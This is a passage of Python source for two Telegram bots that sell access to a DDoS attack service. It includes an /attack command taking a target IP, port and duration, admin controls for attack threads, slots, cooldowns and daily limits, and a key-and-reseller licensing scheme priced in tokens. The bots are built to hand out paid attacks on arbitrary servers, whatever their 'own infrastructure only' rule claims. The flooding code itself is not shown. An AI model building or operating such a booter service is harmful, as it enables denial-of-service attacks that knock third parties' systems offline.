        send_msg(TOKEN1, chat_id, "❌ Use 'd' for days or 'h' for hours")
        return
    key = generate_admin_key1(prefix, days, hours)
    send_msg(TOKEN1, chat_id, f"✅ KEY GENERATED!\n🔑 {key}\n⏱️ Valid: {days}d" if days > 0 else f"✅ KEY GENERATED!\n🔑 {key}\n⏱️ Valid: {hours}h")

def handle_keys1(chat_id):
    if not keys1:
        send_msg(TOKEN1, chat_id, "No keys available!")
        return
    unused = [f"🔑 {k} - {v['days']}d" if v['days'] > 0 else f"🔑 {k} - {v['hours']}h" for k, v in keys1.items() if not v.get('used', False) and not v.get('blocked', False)]
    if unused:
        send_msg(TOKEN1, chat_id, "📋 AVAILABLE KEYS:\n" + "\n".join(unused[:20]))
    else:
        send_msg(TOKEN1, chat_id, "No unused keys!")

def handle_deletekeys1(chat_id):
    keys1.clear()
    save_keys1()
    send_msg(TOKEN1, chat_id, "✅ All keys deleted!")

def handle_blockkey1(chat_id, text):
    key = text.strip().upper()
    if key not in keys1:
        send_msg(TOKEN1, chat_id, "❌ Key not found!")
        return
    if keys1[key].get('blocked', False):
        send_msg(TOKEN1, chat_id, "❌ Key already blocked!")
        return
    creator = keys1[key].get('created_by', 'unknown')
    add_blocked_key1(creator, key)
    send_msg(TOKEN1, chat_id, f"✅ Key {key} blocked!")

def handle_unblockkey1(chat_id, text):
    key = text.strip().upper()
    if not blocked_keys1.get(key, False):
        send_msg(TOKEN1, chat_id, "❌ Key not blocked!")
        return
    remove_blocked_key1(key)
    send_msg(TOKEN1, chat_id, f"✅ Key {key} unblocked!")

def handle_broadcast1(chat_id, text):
    msg = text.strip()
    if not msg:
        send_msg(TOKEN1, chat_id, "Send message to broadcast")
        return
    sent = 0
    for uid in list(users1.keys()):
        try:
            send_msg(TOKEN1, int(uid), f"📢 BROADCAST:\n{msg}")
            sent += 1
        except:
            pass
    send_msg(TOKEN1, chat_id, f"✅ Broadcast sent to {sent} users")

def handle_lock1(chat_id):
    global is_locked1
    is_locked1 = True
    send_msg(TOKEN1, chat_id, "🔒 Bot Locked!")

def handle_unlock1(chat_id):
    global is_locked1
    is_locked1 = False
    send_msg(TOKEN1, chat_id, "🔓 Bot Unlocked!")

def handle_unlimited1(chat_id, text):
    try:
        uid = int(text.strip())
        if str(uid) in resellers1:
            resellers1[str(uid)]['unlimited'] = True
            resellers1[str(uid)]['tokens'] = -1
            save_resellers1()
            send_msg(TOKEN1, chat_id, f"✅ Reseller {uid} now has UNLIMITED tokens!")
        else:
            send_msg(TOKEN1, chat_id, "❌ Reseller not found!")
    except:
        send_msg(TOKEN1, chat_id, "❌ Invalid ID!")

def handle_limited1(chat_id, text):
    parts = text.strip().split()
    if len(parts) != 2:
        send_msg(TOKEN1, chat_id, "Usage: /limited ID TOKENS")
        return
    try:
        uid = int(parts[0])
        tokens = int(parts[1])
        if str(uid) in resellers1:
            resellers1[str(uid)]['unlimited'] = False
            resellers1[str(uid)]['tokens'] = tokens
            save_resellers1()
            send_msg(TOKEN1, chat_id, f"✅ Reseller {uid} now has {tokens} tokens!")
        else:
            send_msg(TOKEN1, chat_id, "❌ Reseller not found!")
    except:
        send_msg(TOKEN1, chat_id, "Invalid input!")

def handle_genkey_reseller1(chat_id, uid):
    buttons = [
        [{"text": "🕐 1 HOUR - 0 TOKENS", "callback_data": "genkey_1h"}],
        [{"text": "🕐 12 HOURS - 2 TOKENS", "callback_data": "genkey_12h"}],
        [{"text": "📅 1 DAY - 4 TOKENS", "callback_data": "genkey_1d"}],
        [{"text": "📅 3 DAYS - 8 TOKENS", "callback_data": "genkey_3d"}],
        [{"text": "📅 7 DAYS - 15 TOKENS", "callback_data": "genkey_7d"}],
        [{"text": "📅 14 DAYS - 30 TOKENS", "callback_data": "genkey_14d"}],
        [{"text": "📅 30 DAYS - 50 TOKENS", "callback_data": "genkey_30d"}],
        [{"text": "❌ CANCEL", "callback_data": "genkey_cancel"}]
    ]
    send_inline_buttons(TOKEN1, chat_id, f"💼 SELECT KEY TYPE\n💰 Balance: {get_reseller_tokens1(uid)}", buttons)

def handle_mykeys1(chat_id, uid):
    keys_list = get_reseller_keys1(uid)
    if not keys_list:
        send_msg(TOKEN1, chat_id, "❌ No keys generated!")
        return
    msg = "🔑 YOUR GENERATED KEYS:\n\n" + "\n".join([f"• {k}" for k in keys_list])
    send_msg(TOKEN1, chat_id, msg[:4000])

def handle_deletekey_reseller1(chat_id, uid, text):
    key = text.strip().upper()
    if key not in keys1 or keys1[key].get('created_by') != str(uid):
        send_msg(TOKEN1, chat_id, "❌ You can only delete keys you generated!")
        return
    if delete_key1(key):
        send_msg(TOKEN1, chat_id, f"✅ Key {key} deleted!")
    else:
        send_msg(TOKEN1, chat_id, "❌ Key not found!")

def handle_blockkey_reseller1(chat_id, uid, text):
    key = text.strip().upper()
    if key not in keys1 or keys1[key].get('created_by') != str(uid):
        send_msg(TOKEN1, chat_id, "❌ You can only block keys you generated!")
        return
    add_blocked_key1(uid, key)
    send_msg(TOKEN1, chat_id, f"✅ Key {key} blocked!")

def handle_unblockkey_reseller1(chat_id, uid, text):
    key = text.strip().upper()
    if not blocked_keys1.get(key, False):
        send_msg(TOKEN1, chat_id, "❌ Key not blocked!")
        return
    remove_blocked_key1(key)
    send_msg(TOKEN1, chat_id, f"✅ Key {key} unblocked!")

def handle_myblockedkeys1(chat_id, uid):
    blocked = get_reseller_blocked_keys1(uid)
    if not blocked:
        send_msg(TOKEN1, chat_id, "❌ No blocked keys!")
        return
    msg = "🚫 YOUR BLOCKED KEYS:\n\n" + "\n".join([f"• {k}" for k in blocked])
    send_msg(TOKEN1, chat_id, msg)

def handle_resellers1(chat_id):
    if not resellers1:
        send_msg(TOKEN1, chat_id, "No resellers!")
        return
    msg = "💼 RESELLERS LIST:\n\n"
    for rid, data in resellers1.items():
        tokens = "∞" if data.get('unlimited', False) else data['tokens']
        msg += f"🆔 {rid}\n💰 Tokens: {tokens}\n📈 Earned: {data['total_earned']}\n━━━━━━━━━━━━━━━━\n"
    send_msg(TOKEN1, chat_id, msg[:4000])

# ==================== BOT 2 FUNCTIONS (mirror) ====================
def is_user2(uid):
    if uid in ADMIN2:
        return True
    return str(uid) in users2 and time.time() < users2[str(uid)]

def add_user2(uid, days):
    users2[str(uid)] = time.time() + (days * 86400)
    save_users2()

def remove_user2(uid):
    if str(uid) in users2:
        del users2[str(uid)]
        save_users2()

def is_group2(gid):
    return str(gid) in groups2 and time.time() < groups2[str(gid)]

def add_group2(gid, days):
    groups2[str(gid)] = time.time() + (days * 86400)
    save_groups2()

def remove_group2(gid):
    if str(gid) in groups2:
        del groups2[str(gid)]
        save_groups2()

def is_reseller2(uid):
    return str(uid) in resellers2

def get_reseller_keys2(uid):
    return resellers2[str(uid)].get('keys_generated', []) if str(uid) in resellers2 else []

def get_reseller_blocked_keys2(uid):
    return resellers2[str(uid)].get('blocked_keys', []) if str(uid) in resellers2 else []

def handle_start2(chat_id, uid):
    if not is_user2(uid):
        send_msg(TOKEN2, chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
   ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
❌ ACCESS DENIED!            
You Are Not Approved!          
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 /redeem KEY - Get Access
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 BUY ACCESS: {CONTACT2}
━━━━━━━━━━━━━━━━━━━━━━━━
""")
        return
    
    if uid in ADMIN2:
        send_msg(TOKEN2, chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
     ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
        👑 WELCOME ADMIN
━━━━━━━━━━━━━━━━━━━━━━━━
📌 USER COMMANDS:                      
/attack IP PORT TIME - Start attack
/stop - Stop attack
/id - Your ID
/redeem KEY - Redeem access key
/help - This menu
/rules - Bot rules
━━━━━━━━━━━━━━━━━━━━━━━━
👑 ADMIN COMMANDS:
/adduser ID DAYS - Add user
/removeuser ID - Remove user
/addreseller ID TOKENS - Add reseller
/removereseller ID - Remove reseller
/setthreads NUM - Set threads
/settime SEC - Set max time
/setslots NUM - Set max slots
/setcooldown SEC - Set cooldown
/setdaily LIMIT - Set daily limit
/gen PREFIX DURATION - Generate key
/keys - List all keys
/deletekeys - Delete all keys
/blockkey KEY - Block key
/unblockkey KEY - Unblock key
/broadcast MSG - Broadcast message
/lock - Lock bot
/unlock - Unlock bot
/unlimited ID - Make reseller unlimited
/limited ID TOKENS - Make reseller limited
━━━━━━━━━━━━━━━━━━━━━━━━
""")
    elif is_reseller2(uid):
        tokens = get_reseller_tokens2(uid)
        keys_count = len(get_reseller_keys2(uid))
        blocked_count = len(get_reseller_blocked_keys2(uid))
        send_msg(TOKEN2, chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
  ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
  💼 RESELLER PANEL                  
  🎫 Tokens: {tokens}
  🔑 Keys Generated: {keys_count}
  🚫 Blocked Keys: {blocked_count}
━━━━━━━━━━━━━━━━━━━━━━━━
📌 COMMANDS:                      
⚔️ ATTACK:
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
━━━━━━━━━━━━━━━━━━━━━━━━
👤 USER:
/id - Get Your ID
/redeem KEY - Redeem Access Key
/help - Help Menu
/rules - Bot Rules
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 KEY MANAGEMENT:
/genkey - Generate Keys
/mykeys - Your keys
/deletekey KEY - Delete your key
/blockkey KEY - Block your key
/unblockkey KEY - Unblock your key
━━━━━━━━━━━━━━━━━━━━━━━━
""")
    else:
        expiry = get_expiry(users2, uid)
        send_msg(TOKEN2, chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
  ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
  ✅ APPROVED USER                  
  📅 Expires: {expiry}          
━━━━━━━━━━━━━━━━━━━━━━━━
📌 COMMANDS:                      
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
/id - Get Your ID
/redeem KEY - Redeem Access Key
/help - Help Menu
/rules - Bot Rules
━━━━━━━━━━━━━━━━━━━━━━━━
""")

def handle_attack_input2(chat_id, uid, text):
    global is_attack, current_target
    
    parts = text.strip().split()
    if len(parts) != 3:
        send_msg(TOKEN2, chat_id, "❌ Send: IP PORT TIME\nExample: 1.2.3.4 80 30")
        waiting_attack2[chat_id] = True
        return
    
    ip, port, sec = parts[0], parts[1], parts[2]
    try:
        port = int(port)
        sec = int(sec)
        if sec < 5 or sec > attack_time:
            send_msg(TOKEN2, chat_id, f"❌ Time must be 5-{attack_time} seconds")
            waiting_attack2[chat_id] = True
            return
    except:
        send_msg(TOKEN2, chat_id, "❌ Invalid port or time")
        waiting_attack2[chat_id] = True
        return
    
    can, msg = can_attack2(uid)
    if not can:
        send_msg(TOKEN2, chat_id, msg)
        waiting_attack2[chat_id] = True
        return
    
    if get_slots() <= 0:
        send_msg(TOKEN2, chat_id, f"❌ ALL {MAX_SLOTS} SLOTS BUSY!")
        waiting_attack2[chat_id] = True
        return
    
    is_attack = True
    current_target = f"{ip}:{port}"
    add_slot()
    add_attack_count2(uid)
    method = random.choice(["UDP", "TCP", "HTTP"])
    
    msg_id = send_msg_and_get_id(TOKEN2, chat_id, f"""
⚡ ATTACK STARTED ⚡
━━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}
🔌 Port: {port}
⏱️ Time: {sec}s
🖥 SERVER    : {server_status}
🚀 BANDWIDTH : {bandwidth}
⚙️ METHOD    : {method}
━━━━━━━━━━━━━━━━━━━━━━
""")
    if msg_id:
        threading.Thread(target=run_progress, args=(TOKEN2, chat_id, msg_id, ip, port, sec, method)).start()
    
    waiting_attack2[chat_id] = False

def handle_stop2(chat_id):
    global is_attack
    if is_attack:
        is_attack = False
        send_msg(TOKEN2, chat_id, "🛑 ATTACK STOPPED!")
    else:
        send_msg(TOKEN2, chat_id, "❌ No active attack!")

def handle_id2(chat_id, uid):
    if not is_user2(uid):
        send_msg(TOKEN2, chat_id, f"🆔 ID: {uid}\n❌ Not Approved\nBuy: {CONTACT2}")
        return
    
    if uid in ADMIN2:
        send_msg(TOKEN2, chat_id, f"🆔 YOUR ID: {uid}\n👑 OWNER")
    elif is_reseller2(uid):
        tokens = get_reseller_tokens2(uid)
        send_msg(TOKEN2, chat_id, f"🆔 YOUR ID: {uid}\n💼 RESELLER\n🎫 Tokens: {tokens}")
    else:
        expiry = get_expiry(users2, uid)
        send_msg(TOKEN2, chat_id, f"🆔 YOUR ID: {uid}\n✅ Approved\n📅 Expires: {expiry}")

def handle_redeem2(chat_id, text):
    key = text.strip().upper()
    success, msg = redeem_key2(chat_id, key)
    send_msg(TOKEN2, chat_id, msg)

def handle_rules2(chat_id):
    send_msg(TOKEN2, chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📜 BOT RULES
━━━━━━━━━━━━━━━━━━━━━━━━
1️⃣ RESPECT THE LIMITS
   • Max 35 attacks per day
   • Cooldown: 100 seconds between attacks

2️⃣ NO SPAMMING
   • Don't flood multiple attacks at once
   • Don't stress test without permission

3️⃣ BE RESPECTFUL
   • Don't target unauthorized servers
   • Only use on your own infrastructure

4️⃣ NO SHARING
   • Don't share your access key
   • Each key is unique per user

5️⃣ CONSEQUENCES
   • Breaking rules = Permanent ban
   • No refunds for banned users
━━━━━━━━━━━━━━━━━━━━━━━━
""")

def handle_help2(chat_id):
    send_msg(TOKEN2, chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
🔥 DDOS BOT HELP 🔥
━━━━━━━━━━━━━━━━━━━━━━━━
USER COMMANDS:
/attack IP PORT TIME - Start attack
/stop - Stop attack
/id - Your ID
/redeem KEY - Redeem access key
/help - This menu
/rules - Bot rules
━━━━━━━━━━━━━━━━━━━━━━━━
ADMIN COMMANDS:
/adduser ID DAYS - Add user
/removeuser ID - Remove user
/addreseller ID TOKENS - Add reseller
/removereseller ID - Remove reseller
/setthreads NUM - Set threads
/settime SEC - Set max time
/setslots NUM - Set max slots
/setcooldown SEC - Set cooldown
/setdaily LIMIT - Set daily limit
/gen PREFIX DURATION - Generate key
/keys - List all keys
/deletekeys - Delete all keys
/blockkey KEY - Block key
/unblockkey KEY - Unblock key
/broadcast MSG - Broadcast message
/lock - Lock bot
/unlock - Unlock bot
/unlimited ID - Make reseller unlimited
/limited ID TOKENS - Make reseller limited
━━━━━━━━━━━━━━━━━━━━━━━━
RESELLER COMMANDS:
/genkey - Generate key
/mykeys - Your keys
/deletekey KEY - Delete your key
/blockkey KEY - Block your key
/unblockkey KEY - Unblock your key
━━━━━━━━━━━━━━━━━━━━━━━━
    """)

def handle_adduser2(chat_id, text):
    parts = text.strip().split()
    if len(parts) != 2:
        send_msg(TOKEN2, chat_id, "❌ Send: USER_ID DAYS\nExample: 123456789 7")
        return
    try:
        uid = int(parts[0])
        days = int(parts[1])
        if 1 <= days <= 30:
            add_user2(uid, days)
            send_msg(TOKEN2, chat_id, f"✅ User {uid} added for {days} days!")
        else:
            send_msg(TOKEN2, chat_id, "Days must be 1-30")
    except:
        send_msg(TOKEN2, chat_id, "Invalid input")

def handle_removeuser2(chat_id, text):
    try:
        uid = int(text.strip())
        remove_user2(uid)
        send_msg(TOKEN2, chat_id, f"✅ User {uid} removed!")
    except:
        send_msg(TOKEN2, chat_id, "Invalid USER ID")

def handle_addgroup2(chat_id, text):
    parts = text.strip().split()
    if len(parts) != 2:
        send_msg(TOKEN2, chat_id, "❌ Send: GROUP_ID DAYS\nExample: -100123456789 7")
        return
    try:
        gid = parts[0]
        days = int(parts[1])
        if 1 <= days <= 30:
            add_group2(gid, days)
            send_msg(TOKEN2, chat_id, f"✅ Group {gid} added for {days} days!")
        else:
            send_msg(TOKEN2, chat_id, "Days must be 1-30")
    except:
        send_msg(TOKEN2, chat_id, "Invalid input")

def handle_removegroup2(chat_id, text):
    try:
        gid = text.strip()
        remove_group2(gid)
        send_msg(TOKEN2, chat_id, f"✅ Group {gid} removed!")
    except:
        send_msg(TOKEN2, chat_id, "Invalid GROUP ID")

def handle_addreseller2(chat_id, text):
    parts = text.strip().split()
    if len(parts) != 2:
        send_msg(TOKEN2, chat_id, "❌ Send: USER_ID TOKENS\nExample: 123456789 100")
        return
    try:
        uid = int(parts[0])
        tokens = int(parts[1])
        add_reseller2(uid, tokens)
        send_msg(TOKEN2, chat_id, f"✅ Reseller {uid} added with {tokens} tokens!")
    except:
        send_msg(TOKEN2, chat_id, "Invalid input")

def handle_removereseller2(chat_id, text):
    try:
        uid = int(text.strip())
        remove_reseller2(uid)
        send_msg(TOKEN2, chat_id, f"✅ Reseller {uid} removed!")
    except:
        send_msg(TOKEN2, chat_id, "Invalid ID")

def handle_setthreads2(chat_id, text):
    global attack_threads
    try:
        threads = int(text.strip())
        if 100 <= threads <= 5000:
            attack_threads = threads
            send_msg(TOKEN2, chat_id, f"✅ Threads set to {attack_threads}")
        else:
            send_msg(TOKEN2, chat_id, "Threads must be 100-5000")
    except:
        send_msg(TOKEN2, chat_id, "Invalid number")

def handle_settime2(chat_id, text):
    global attack_time
    try:
        time_sec = int(text.strip())
        if 60 <= time_sec <= 600:
            attack_time = time_sec
            send_msg(TOKEN2, chat_id, f"✅ Max time set to {attack_time}s")
        else:
            send_msg(TOKEN2, chat_id, "Time must be 60-600 seconds")
    except:
        send_msg(TOKEN2, chat_id, "Invalid number")

def handle_setslots2(chat_id, text):
    global MAX_SLOTS
    try:
        slots = int(text.strip())
        if 1 <= slots <= 200:
            MAX_SLOTS = slots
            send_msg(TOKEN2, chat_id, f"✅ Max slots set to {MAX_SLOTS}")
        else:
            send_msg(TOKEN2, chat_id, "Slots must be 1-200")
    except:
        send_msg(TOKEN2, chat_id, "Invalid number")

def handle_setcooldown2(chat_id, text):
    global cooldown_seconds
    try:
        cooldown = int(text.strip())
        if 0 <= cooldown <= 600:
            cooldown_seconds = cooldown
            send_msg(TOKEN2, chat_id, f"✅ Cooldown set to {cooldown_seconds}s")
        else:
            send_msg(TOKEN2, chat_id, "Cooldown must be 0-600 seconds")
    except:
        send_msg(TOKEN2, chat_id, "Invalid number")

def handle_setdaily2(chat_id, text):
    global attack_daily_limit
    try:
        limit = int(text.strip())
        if 1 <= limit <= 1000:
            attack_daily_limit = limit
            send_msg(TOKEN2, chat_id, f"✅ Daily limit set to {attack_daily_limit}")
        else:
            send_msg(TOKEN2, chat_id, "Limit must be 1-1000")
    except:
        send_msg(TOKEN2, chat_id, "Invalid number")

def handle_gen2(chat_id, text):
    parts = text.strip().split()
    if len(parts) != 2:
        send_msg(TOKEN2, chat_id, "Usage: /gen PREFIX DURATION\nExample: /gen DEVIL 7d")
        return
    prefix, duration = parts[0].upper(), parts[1].lower()
    days, hours = 0, 0
    if duration.endswith('d'):
        days = int(duration[:-1])
    elif duration.endswith('h'):
        hours = int(duration[:-1])
    else:
        send_msg(TOKEN2, chat_id, "❌ Use 'd' for days or 'h' for hours")
        return
    key = generate_admin_key2(prefix, days, hours)
    send_msg(TOKEN2, chat_id, f"✅ KEY GENERATED!\n🔑 {key}\n⏱️ Valid: {days}d" if days > 0 else f"✅ KEY GENERATED!\n🔑 {key}\n⏱️ Valid: {hours}h")

def handle_keys2(chat_id):
    if not keys2:
        send_msg(TOKEN2, chat_id, "No keys available!")
        return
    unused = [f"🔑 {k} - {v['days']}d" if v['days'] > 0 else f"🔑 {k} - {v['hours']}h" for k, v in keys2.items() if not v.get('used', False) and not v.get('blocked', False)]
    if unused:
        send_msg(TOKEN2, chat_id, "📋 AVAILABLE KEYS:\n" + "\n".join(unused[:20]))
    else:
        send_msg(TOKEN2, chat_id, "No unused keys!")

def handle_deletekeys2(chat_id):
    keys2.clear()
    save_keys2()
    send_msg(TOKEN2, chat_id, "✅ All keys deleted!")

def handle_blockkey2(chat_id, text):
    key = text.strip().upper()
    if key not in keys2:
        send_msg(TOKEN2, chat_id, "❌ Key not found!")
        return
    if keys2[key].get('blocked', False):
        send_msg(TOKEN2, chat_id, "❌ Key already blocked!")
        return
    creator = keys2[key].get('created_by', 'unknown')
    add_blocked_key2(creator, key)
    send_msg(TOKEN2, chat_id, f"✅ Key {key} blocked!")

def handle_unblockkey2(chat_id, text):
    key = text.strip().upper()
    if not blocked_keys2.get(key, False):
        send_msg(TOKEN2, chat_id, "❌ Key not blocked!")
        return
    remove_blocked_key2(key)
    send_msg(TOKEN2, chat_id, f"✅ Key {key} unblocked!")

def handle_broadcast2(chat_id, text):
    msg = text.strip()
    if not msg:
        send_msg(TOKEN2, chat_id, "Send message to broadcast")
        return
    sent = 0
    for uid in list(users2.keys()):
        try:
            send_msg(TOKEN2, int(uid), f"📢 BROADCAST:\n{msg}")
            sent += 1
        except:
            pass
    send_msg(TOKEN2, chat_id, f"✅ Broadcast sent to {sent} users")

def handle_lock2(chat_id):
    global is_locked2
    is_locked2 = True
    send_msg(TOKEN2, chat_id, "🔒 Bot Locked!")

def handle_unlock2(chat_id):
    global is_locked2
    is_locked2 = False
    send_msg(TOKEN2, chat_id, "🔓 Bot Unlocked!")

def handle_unlimited2(chat_id, text):
    try:
        uid = int(text.strip())
        if str(uid) in resellers2:
            resellers2[str(uid)]['unlimited'] = True
            resellers2[str(uid)]['tokens'] = -1
            save_resellers2()
            send_msg(TOKEN2, chat_id, f"✅ Reseller {uid} now has UNLIMITED tokens!")
        else:
            send_msg(TOKEN2, chat_id, "❌ Reseller not found!")
    except:
        send_msg(TOKEN2, chat_id, "❌ Invalid ID!")

def handle_limited2(chat_id, text):
    parts = text.strip().split()
    if len(parts) != 2:
        send_msg(TOKEN2, chat_id, "Usage: /limited ID TOKENS")
        return
    try:
        uid = int(parts[0])
        tokens = int(parts[1])
        if str(uid) in resellers2:
            resellers2[str(uid)]['unlimited'] = False
            resellers2[str(uid)]['tokens'] = tokens
            save_resellers2()
            send_msg(TOKEN2, chat_id, f"✅ Reseller {uid} now has {tokens} tokens!")
        else:
            send_msg(TOKEN2, chat_id, "❌ Reseller not found!")
    except:
        send_msg(TOKEN2, chat_id, "Invalid input!")

def handle_genkey_reseller2(chat_id, uid):
    buttons = [
        [{"text": "🕐 1 HOUR - 0 TOKENS", "callback_data": "genkey_1h"}],
        [{"text": "🕐 12 HOURS - 2 TOKENS", "callback_data": "genkey_12h"}],
        [{"text": "📅 1 DAY - 4 TOKENS", "callback_data": "genkey_1d"}],
        [{"text": "📅 3 DAYS - 8 TOKENS", "callback_data": "genkey_3d"}],
        [{"text": "📅 7 DAYS - 15 TOKENS", "callback_data": "genkey_7d"}],
        [{"text": "📅 14 DAYS - 30 TOKENS", "callback_data": "genkey_14d"}],
        [{"text": "📅 30 DAYS - 50 TOKENS", "callback_data": "genkey_30d"}],
        [{"text": "❌ CANCEL", "callback_data": "genkey_cancel"}]
    ]
    send_inline_buttons(TOKEN2, chat_id, f"💼 SELECT KEY TYPE\n💰 Balance: {get_reseller_tokens2(uid)}", buttons)

def handle_mykeys2(chat_id, uid):
    keys_list = get_reseller_keys2(uid)
    if not keys_list:
        send_msg(TOKEN2, chat_id, "❌ No keys generated!")
        return
    msg = "🔑 YOUR GENERATED KEYS:\n\n" + "\n".join([f"• {k}" for k in keys_list])
    send_msg(TOKEN2, chat_id, msg[:4000])

def handle_deletekey_reseller2(chat_id, uid, text):
    key = text.strip().upper()
    if key not in keys2 or keys2[key].get('created_by') != str(uid):
        send_msg(TOKEN2, chat_id, "❌ You can only delete keys you generated!")
        return
    if delete_key2(key):
        send_msg(TOKEN2, chat_id, f"✅ Key {key} deleted!")
    else:
        send_msg(TOKEN2, chat_id, "❌ Key not found!")

def handle_blockkey_reseller2(chat_id, uid, text):
    key = text.strip().upper()
    if key not in keys2 or keys2[key].get('created_by') != str(uid):
        send_msg(TOKEN2, chat_id, "❌ You can only block keys you generated!")
        return
    add_blocked_key2(uid, key)
    send_msg(TOKEN2, chat_id, f"✅ Key {key} blocked!")

def handle_unblockkey_reseller2(chat_id, uid, text):
    key = text.strip().upper()
    if not blocked_keys2.get(key, False):
        send_msg(TOKEN2, chat_id, "❌ Key not blocked!")
        return
    remove_blocked_key2(key)
    send_msg(TOKEN2, chat_id, f"✅ Key {key} unblocked!")

def handle_myblockedkeys2(chat_id, uid):
    blocked = get_reseller_blocked_keys2(uid)
    if not blocked:
        send_msg(TOKEN2, chat_id, "❌ No blocked keys!")
        return
    msg = "🚫 YOUR BLOCKED KEYS:\n\n" + "\n".join([f"• {k}" for k in blocked])
    send_msg(TOKEN2, chat_id, msg)

def handle_resellers2(chat_id):
    if not resellers2:
        send_msg(TOKEN2, chat_id, "No resellers!")
        return
    msg = "💼 RESELLERS LIST:\n\n"
    for rid, data in resellers2.items():
        tokens = "∞" if data.get('unlimited', False) else data['tokens']
        msg += f"🆔 {rid}\n💰 Tokens: {tokens}\n📈 Earned: {data['total_earned']}\n━━━━━━━━━━━━━━━━\n"
    send_msg(TOKEN2, chat_id, msg[:4000])

# ==================== MAIN LOOP ====================
def main():
    load_users1()
    load_users2()
    load_keys1()
    load_keys2()
    load_groups1()
    load_groups2()
    load_resellers1()
    load_resellers2()
    load_attack_count1()
    load_attack_count2()
    compile_binary()
    
    print("="*60)
    print("  🔥 BOTH DDOS BOTS STARTED 🔥")
    print("="*60)
    print(f"🤖 BOT 1: @TG_ROLEX (Admins: {ADMIN1})")
    print(f"🤖 BOT 2: @TG_DEVILOP (Admins: {ADMIN2})")
    print("="*60)
    print("✅ INSTANT REPLY MODE ACTIVE")
    print("="*60)
    
    last_id1 = 0
    last_id2 = 0
    waiting1 = {}
    waiting2 = {}
    
    while True:
        try:
            # Bot 1 updates
            url1 = f"https://api.telegram.org/bot{TOKEN1}/getUpdates?offset={last_id1+1}&timeout=1"
            r1 = requests.get(url1, timeout=2)
            data1 = r1.json()
            
            for update in data1.get("result", []):
                last_id1 = update["update_id"]
                msg = update.get("message")
                if not msg:
                    continue
                chat_id = msg["chat"]["id"]
                uid = msg["from"]["id"]
                text = msg.get("text", "")
                
                if not text:
                    continue
                
                cmd = text.lower()
                
                # Check waiting states
                if waiting1.get(chat_id) == "attack":
                    handle_attack_input1(chat_id, uid, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "redeem":
                    handle_redeem1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "adduser":
                    handle_adduser1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "removeuser":
                    handle_removeuser1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "addgroup":
                    handle_addgroup1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "removegroup":
                    handle_removegroup1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "addreseller":
                    handle_addreseller1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "removereseller":
                    handle_removereseller1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "setthreads":
                    handle_setthreads1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "settime":
                    handle_settime1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "setslots":
                    handle_setslots1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "setcooldown":
                    handle_setcooldown1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "setdaily":
                    handle_setdaily1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "gen":
                    handle_gen1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "blockkey":
                    handle_blockkey1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "unblockkey":
                    handle_unblockkey1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "broadcast":
                    handle_broadcast1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "unlimited":
                    handle_unlimited1(chat_id, text)
                    waiting1[chat_id] = False
                elif waiting1.get(chat_id) == "limited":
                    handle_limited1(chat_id, text)
                    waiting1[chat_id] = False
                else:
                    # Command handling
                    if cmd == "/start":
                        handle_start1(chat_id, uid)
                    elif cmd == "/attack":
                        waiting1[chat_id] = "attack"
                        send_msg(TOKEN1, chat_id, "Send: IP PORT TIME\nExample: 1.2.3.4 80 30")
                    elif cmd == "/stop":
                        handle_stop1(chat_id)
                    elif cmd == "/id":
                        handle_id1(chat_id, uid)
                    elif cmd == "/redeem":
                        waiting1[chat_id] = "redeem"
                        send_msg(TOKEN1, chat_id, "Enter your redemption key")
                    elif cmd == "/adduser":
                        waiting1[chat_id] = "adduser"
                        send_msg(TOKEN1, chat_id, "Send: USER_ID DAYS\nExample: 123456789 7")
                    elif cmd == "/removeuser":
                        waiting1[chat_id] = "removeuser"
                        send_msg(TOKEN1, chat_id, "Send USER_ID to remove")
                    elif cmd == "/addgroup":
                        waiting1[chat_id] = "addgroup"
                        send_msg(TOKEN1, chat_id, "Send: GROUP_ID DAYS\nExample: -100123456789 7")
                    elif cmd == "/removegroup":
                        waiting1[chat_id] = "removegroup"
                        send_msg(TOKEN1, chat_id, "Send GROUP ID to remove")
                    elif cmd == "/addreseller":
                        waiting1[chat_id] = "addreseller"
                        send_msg(TOKEN1, chat_id, "Send: USER_ID TOKENS\nExample: 123456789 100")
                    elif cmd == "/removereseller":
                        waiting1[chat_id] = "removereseller"
                        send_msg(TOKEN1, chat_id, "Send USER ID to remove")
                    elif cmd == "/setthreads":
